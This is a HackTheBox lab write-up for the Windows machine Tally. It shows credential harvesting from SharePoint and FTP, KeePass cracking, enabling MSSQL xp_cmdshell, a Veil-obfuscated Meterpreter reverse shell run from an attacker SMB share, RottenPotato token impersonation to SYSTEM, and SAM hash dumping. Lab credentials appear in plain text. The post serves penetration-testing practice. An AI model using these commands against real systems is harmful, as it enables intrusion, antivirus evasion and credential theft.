---
layout: single
title:  "HTB - Tally Writeup - 10.10.10.59"
date:   2020-08-07 08:49:23 +0100
categories: hackthebox
excerpt: My walkthrough of the HTB Windows Server 2016 machine Tally.
---
![tally](/images/tally/tally.png)

# HackTheBox - Tally - 10.10.10.59

Tally is a hard difficulty Windows Server 2016 machine on [hackthebox.eu](https://app.hackthebox.eu).

## Summary
Tally can be a very challenging machine for some. It focuses on many different aspects of real Windows environments and requires users to modify and compile an exploit for escalation. Covered in this post is the use of Rotten Potato, which is an unintended alternate method for privilege escalation.


## Recon and Scanning
### Nmap Results
![nmap scan](/images/tally/nmap.png)

From the ports open we can clearly see that this is a domain controller and that it is running Windows Server 2016 by the SQL Server version. You can also see that there is a share point site running on port 80

## Enumerating Sharepoint

As we know there is a sharepoint site we can go and look at [http://10.10.10.59/layouts/viewlsts.aspx](http://10.10.10.59/_layouts/viewlsts.aspx) to see all the documents hosted on the sharepoint.

![viewlists](/images/tally/sp-1.png)

### FTP Credentials

Inside the documents folder there is a document called `ftp-details.docx`, inside this we will find credentials for the FTP server.

![ftp-1](/images/tally/ftp-1.png)

![ftp-2](/images/tally/ftp-2.png)

Creds - `ftp_user:UTDRSCH53c"$6hys`

## FTP Enumeration

Now that we have credentials we can login to the ftp server and browse around.

![ftp-3](/images/tally/ftp-3.png)

Inside `\User\Tim\Files` we see a `.kbdx` file which is a `keepassx` database file, if we can crack the password we will have access to whatever credentials are inside. We can crack it using john the ripper.

## Getting More Credentials
### Cracking the KeePassX DB file

Firstly, we will need to download the file to our local machine and use `keepass2john` to get a hash file that we can then crack with `rockyou.txt`

![](/images/tally/tim-hash.png)

Now crack it with john

![](/images/tally/hash-cracked.png)

Bingo! Now let's open it with KeePassX and view the stored credentials

![](/images/tally/acct-creds.png)

Creds - `Finance:Acc0unting`

### Accessing the Accounting SMB Share

We now have credentials for a share named acct, let's mount this and view all the files

![](/images/tally/mnt-1.png)

After some manual enumeration, we come a across a file called `tester.exe`, running strings on the file reveals the credentials for the MSSQL Server we saw in the nmap scan.

![](/images/tally/sql-1.png)

Creds - `sa:GWE3V65#6KFH93@4GWTG2G`

## Getting Command Execution using the MSSQL Server and 'xp_cmdshell'

Now that we have creds for the SQL Server we can login using `sqsh`, a tool built into Kali.

{% highlight bash %}
sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
{% endhighlight %}

![](/images/tally/sql-2.png)

### Enabling xp_cmdshell

Now that a connection has been established we can enable the `xp_cmdshell` function, so that we can execute system commands as the user who is running the database server. The following commands are used to enable the function.

{% highlight sql %}
exec sp_configure ‘show advanced options’, 1
go
reconfigure
go
exec sp_configure ‘xp_cmdshell’, 1
go
reconfigure
go
{% endhighlight %}

![](/images/tally/sql-3.png)

## Getting a Meterpreter Session using Veil

Now we have command execution on the box, we can generate a Meterpreter reverse shell payload, to do this I will use [Veil](https://github.com/Veil-Framework/Veil) to create an encrypted Meterpreter payload to bypass windows defender which I presume is running on the machine.

To install Veil on Kali, simple run:

{% highlight bash %}
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
{% endhighlight %}

Now that veil has been installed we can launch it with: `veil`

![](/images/tally/veil-1.png)

We want to select the evasion module, so type
{% highlight bash %}
use 1
list
{% endhighlight %}

This will show us all the available modules

![](/images/tally/veil-2.png)

The module we want is `powershell/Meterpreter/rev_tcp.py`

![](/images/tally/veil-3.png)

Select it with `use 22`

![](/images/tally/veil-4.png)

Now finally, set the LHOST and LPORT and then type, `generate`

![](/images/tally/veil-5.png)

Now that we have our `tally-msf.bat` file, we can serve it to the box using `smbserver.py`, firstly, we need to set up metasploit, this can be done by using the pre-built resource file, `tally-msf.rc`.

![](/images/tally/veil-6.png)

We can now start up our Meterpreter listner with:
{% highlight bash %}
msfconsole -r /var/lib/veil/output/handlers/tally-msf.rc
{% endhighlight %}

![](/images/tally/msf-1.png)

We can now execute our bat file over the network with `xp_cmdshell` and our `SMB Server`

{% highlight bash %}
xp_cmdshell '\\10.10.14.30\share\tally-msf.bat'
go
{% endhighlight %}

![](/images/tally/msf-2.png)

![](/images/tally/msf-3.png)

## Priv Esc to SYSTEM

Now that we have a shell as a user on the machine, we can use the `rottenpotato` attack to impersonate the SYSTEM user, I deduced this as the box is a very early release of Server 2016 and doesn't appear to have many hotfix's installed. If you want a detailed explation of the attack, the article [Here](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) is very good. We also have the required privelages to run this attack, as seen here.

![](/images/tally/msf-4.png)

### Impersonating SYSTEM with Incognito 

Firstly, download RottenPotato from the [GitHub Here](https://github.com/breenmachine/RottenPotatoNG) and upload it to the box with Meterpreter 

![](/images/tally/msf-5.png)

Now we can load [Metasploit's incognito module](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/) and then run `rottenpotato.exe`

{% highlight bash %}
load incognito
execute -f rottenpotato.exe -Hc
list_tokens -u
{% endhighlight %}

![](/images/tally/msf-6.png)

As you can see we have the `SYSTEM` users impersonation token avaliable, so we can impersonate it with:

{% highlight bash %}
impersonate_token "NT AUTHORITY\\SYSTEM"
{% endhighlight %}

![](/images/tally/msf-7.png)

## User and Root Flags

Now that we have a shell as SYSTEM we can grab both the User and Root flags.

![](/images/tally/flags.png)

## Dumping the Domain Hashes

We can also dump all of the hashes in the domain using Metasploit's [Kiwi Module](https://www.offensive-security.com/metasploit-unleashed/mimikatz/)

{% highlight bash %}
load kiwi
lsa_dump_sam
{% endhighlight %}

![](/images/tally/hashes.png)

## Pwned

![pwned](/images/tally/pwned.png)

## Respect
If you enjoyed the write up or found it useful consider + repping my htb profile linked below:

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)

